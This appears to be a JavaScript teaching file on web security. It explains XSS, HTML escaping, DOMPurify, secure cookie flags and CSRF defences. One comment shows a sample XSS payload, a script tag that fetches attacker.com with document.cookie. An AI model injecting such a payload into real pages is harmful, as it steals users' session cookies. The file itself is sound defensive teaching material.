// ==========================================
// TOPIC: Web Security in JavaScript (XSS, CSRF, Sanitization)
// ==========================================

/*
Definition:
Web security refers to the protective measures and protocols implemented to secure web applications 
from cyber threats and malicious activities. As frontend developers, understanding vulnerabilities 
like XSS and CSRF is vital to safeguard user data.

Key Vulnerabilities & Defenses:
1. XSS (Cross-Site Scripting)
2. Sanitization (Defense against XSS)
3. CSRF (Cross-Site Request Forgery)

================================================================================
SYNTAX REFERENCE
================================================================================
// Basic escaping function
function escapeHTML(str) {
    return str.replace(/[&<>'"]/g, tag => ({
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        "'": '&#39;',
        '"': '&quot;'
    }[tag] || tag));
}

// Safer DOM assignment (prevents XSS)
element.textContent = userInput; // use instead of innerHTML

// Secure Cookie settings (Server Header syntax)
Set-Cookie: session_id=xyz; Secure; HttpOnly; SameSite=Strict;
*/


// ==========================================
// 1. XSS (Cross-Site Scripting)
// ==========================================
// XSS occurs when an attacker injects malicious scripts into content that is subsequently executed 
// by another user's browser.
// Threat: Access to document.cookie (session hijacks), capturing inputs, redirecting pages.

/*
Scenario of Vulnerability:
Suppose a user submits a comment: "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>"
If the app displays comments using:
  commentContainer.innerHTML = userInput;
The browser will execute the attacker's script.
*/


// ==========================================
// 2. Sanitization & Escaping (Defending against XSS)
// ==========================================
// Sanitization means cleaning input by stripping out executable scripts or tags.
// Escaping means converting special HTML characters into safe HTML entities so they are parsed 
// as text, not executable elements.

console.log("--- 2. Escaping Input ---");

function escapeHTML(str) {
    return str.replace(/[&<>'"]/g, 
        tag => ({
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            "'": '&#39;',
            '"': '&quot;'
        }[tag] || tag)
    );
}

const maliciousInput = "<script>alert('hacked!')</script>";
const safeOutput = escapeHTML(maliciousInput);

console.log("Original Input:", maliciousInput);
console.log("Escaped Output: ", safeOutput); 
// Output: Escaped Output:  &lt;script&gt;alert(&#39;hacked!&#39;)&lt;/script&gt; 
// (Safe to display because browser displays characters but doesn't run the script!)

/*
Modern Best Practices for Sanitization:
- Use textContent instead of innerHTML when inserting text.
- Use established libraries like DOMPurify to sanitize HTML markup:
  const cleanHTML = DOMPurify.sanitize(dirtyHTML);
*/


// ==========================================
// 3. CSRF (Cross-Site Request Forgery)
// ==========================================
// CSRF forces an authenticated user to execute unwanted actions on a web application 
// in which they are currently authenticated.
// Threat: If a user is logged into their bank at bank.com, an attacker could trick them into clicking 
// a link to malicioussite.com that submits a form triggering a transaction on bank.com.

/*
Defenses against CSRF:
1. Anti-CSRF Tokens:
   The server generates a unique, secret, one-time token associated with the user session. 
   Every modifying form/request must submit this token, which the server verifies.

2. SameSite Cookie Attribute:
   Configure cookies with SameSite=Strict or SameSite=Lax. This tells browsers NOT to send 
   cookies along with cross-site requests (e.g., clicking a link on another domain won't attach cookies).
   Syntax on Server Header:
   Set-Cookie: session_id=xyz; Secure; HttpOnly; SameSite=Strict;
*/
